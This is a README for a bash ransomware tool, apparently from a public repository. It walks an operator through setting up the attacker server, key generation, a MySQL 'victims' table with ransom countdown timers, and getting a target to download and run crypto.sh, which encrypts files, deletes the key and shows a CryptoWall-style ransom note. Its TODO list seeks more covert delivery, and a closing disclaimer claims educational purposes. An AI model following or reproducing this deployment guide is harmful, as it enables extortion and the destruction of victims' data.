# Bash Ransomware

## Requirements
 - openssl
 - jquery
 - mysql
 - php 5 (php5-mysql)

## What to do on the server-side
 - $ openssl genrsa -out priv.pem 4096
 - $ openssl rsa -pubout -in priv.pem -out pub.pem
 - $ cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > key.bin
 - $ mkdir -p /var/www/html/downloads
 - $ cp pub.pem /var/www/html/downloads/
 - $ cp key.bin /var/www/html/downloads/
 - > Modify crypto.sh and replace the IPwith your web server's IP/URL
 - $ cp crypto.sh /var/www/html/downloads/
 - > Copy all of the ransomware files to /var/www/html
 - > You should have all of the php files in the root of your web dir (/var/www/html/)
 - > You should also have /var/www/html/images/ and /var/www/html/scripts/
 - $ cd /var/www/html/downloads
 - $ python -m SimplHTTPServer 8080 &
 - $ cd ../
 - > Modify admin.php, admin_query.php, decrypt.php, query.php, and target.php with your database information
 - > Next, create the database for storing the data
 - $ mysql -u [user] -p
 - $ create database victims;
 - $ use victims;
 - $ create table target_list (id int(6) unsigned auto_increment primary key, unique_id varchar(16) not null, target_ip varchar(30), curr_time timestamp not null, exp_time timestamp not null, time_expired bool not null);
 - $ exit

## What to do on the client-side
 - Get target to download the file and execute or if you have have access to the system, download it directly
 - $ chmod 755 crypto.sh
 - $ ./crypto.sh &

## What it does
 - Downloads the public key and key file to the target
 - Move DB settings into a common.php file and refer to that file ineach of the scripts (One place to edit instead of numerous places)
 - Loops through the system and encrypts the various files
 - Deletes the key file and leaves the public key
 - Prints the ransom message
 - Links to web pages where the user can see an active countdown of the time that is left before key deletion

## TODO
 - Configure script to download over https, more covert
 - Add in error handling for non-existing files
 - Imporve functionality and capabilities
 - Unique key pair per victim (In work)
 - Add Screenshots
 - Make ransom message on web page prettier 

## Acknowledgements/Contributors
  - Special thanks to zmallen and his lollocker (https://github.com/zmallen/lollocker)
  - lollocker served as the inspiration for this project
  - CryptoWall message text used came from https://www.pcrisk.com/removal-guides/7844-cryptowall-virus

## WARNING 
  - Use this tool at your own risk. Author is not responsible or liable if you damage your own system or others. Follow all local, state, federal, and international laws as it pertains to your geographic location. Do NOT use this tool maliciously as it is being released for educational purposes for use in cyber exercises or demonstrations of adversarial tools.
